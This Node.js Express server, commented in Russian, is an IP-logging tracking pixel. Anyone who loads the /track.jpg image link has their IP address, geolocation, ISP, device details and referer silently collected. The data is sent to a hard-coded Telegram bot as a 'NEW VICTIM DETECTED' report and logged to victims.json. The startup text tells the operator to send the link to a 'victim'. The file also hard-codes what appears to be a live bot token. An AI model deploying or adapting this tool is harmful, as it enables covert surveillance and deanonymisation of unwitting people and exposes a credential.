const express = require('express');
const fs = require('fs');
const axios = require('axios');
const app = express();

const PIXEL = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');

// Telegram конфиг
const TELEGRAM_TOKEN = '8652352513:AAGCxb8tQydzu0WhMf1sFQXjmmBOm7zFnn0';
const TELEGRAM_CHAT_ID = '8652352513';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

// Функция отправки сообщения в Telegram
async function sendToTelegram(message) {
    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
    } catch(e) {
        console.log('Telegram error:', e.message);
    }
}

// Функция отправки файла в Telegram
async function sendFileToTelegram(filePath, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', fs.createReadStream(filePath));
        formData.append('caption', caption);
        
        await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: { ...formData.getHeaders() }
        });
    } catch(e) {
        console.log('File send error:', e.message);
    }
}

// Парсинг User-Agent
function parseUserAgent(ua) {
    if (!ua) return {};
    return {
        raw: ua,
        isMobile: /mobile|android|iphone|ipad|phone/i.test(ua),
        isBot: /bot|crawler|spider|scraper/i.test(ua),
        browser: (ua.includes('Firefox') ? 'Firefox' : 
                   ua.includes('Chrome') && !ua.includes('Edg') ? 'Chrome' :
                   ua.includes('Safari') && !ua.includes('Chrome') ? 'Safari' :
                   ua.includes('Edg') ? 'Edge' : 'Other'),
        os: (ua.includes('Windows') ? 'Windows' :
             ua.includes('Mac OS') ? 'macOS' :
             ua.includes('Android') ? 'Android' :
             ua.includes('iPhone') ? 'iOS' : 'Other'),
        device: (ua.includes('Mobile') ? 'Mobile' : 'Desktop')
    };
}

// Геолокация по IP
async function getGeoLocation(ip) {
    if (ip === '127.0.0.1' || ip.startsWith('192.168') || ip.startsWith('10.')) {
        return { status: 'local' };
    }
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        return response.data;
    } catch(e) {
        return { status: 'error' };
    }
}

// Главный маршрут
app.get('/track.jpg', async (req, res) => {
    // Получаем IP
    let ip = req.headers['x-forwarded-for']?.split(',')[0] || 
             req.headers['x-real-ip'] ||
             req.socket.remoteAddress ||
             req.ip;
    ip = ip?.replace('::ffff:', '');
    
    // Получаем реферер
    const referer = req.headers['referer'] || req.headers['referrer'] || null;
    let website = 'direct';
    if (referer) {
        try {
            const url = new URL(referer);
            website = url.hostname;
        } catch(e) {}
    }
    
    // Парсим User-Agent
    const ua = req.headers['user-agent'] || 'unknown';
    const uaInfo = parseUserAgent(ua);
    
    // Геолокация
    const geo = await getGeoLocation(ip);
    
    // Формируем отчет
    const report = `
🔍 <b>NEW VICTIM DETECTED</b> 🔍
━━━━━━━━━━━━━━━━━━━━━
🌐 <b>IP Address:</b> <code>${ip}</code>
📍 <b>Location:</b> ${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}
🗺️ <b>Coordinates:</b> ${geo?.lat || '?'}, ${geo?.lon || '?'}
🏢 <b>ISP:</b> ${geo?.isp || 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━
💻 <b>Device Info:</b>
   • OS: ${uaInfo.os}
   • Browser: ${uaInfo.browser}
   • Device: ${uaInfo.device}
   • Mobile: ${uaInfo.isMobile ? 'Yes' : 'No'}
━━━━━━━━━━━━━━━━━━━━━
🌍 <b>Source:</b>
   • Website: ${website}
   • Referer: ${referer || 'direct'}
━━━━━━━━━━━━━━━━━━━━━
📱 <b>User-Agent:</b>
<code>${ua.substring(0, 100)}${ua.length > 100 ? '...' : ''}</code>
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
`;

    // Отправляем в Telegram
    await sendToTelegram(report);
    
    // Сохраняем в файл
    const logEntry = {
        ip,
        geo,
        website,
        userAgent: ua,
        uaInfo,
        referer,
        timestamp: new Date().toISOString()
    };
    fs.appendFileSync('victims.json', JSON.stringify(logEntry) + '\n');
    
    console.log(`[+] Отчет отправлен в Telegram | IP: ${ip} | Site: ${website}`);
    
    // Отправляем пиксель
    res.set('Content-Type', 'image/gif');
    res.send(PIXEL);
});

// Маршрут для проверки бота
app.get('/test', async (req, res) => {
    await sendToTelegram('✅ <b>Бот активен и работает!</b>\nСервер запущен и ждет жертв.');
    res.send('Test message sent');
});

app.listen(3000, '0.0.0.0', () => {
    console.log(`
[+] Сервер на http://0.0.0.0:3000
[+] Telegram бот готов
[+] Отправьте жертве: http://ВАШ_IP:3000/track.jpg
    
[+] Для теста бота: http://localhost:3000/test
    `);
});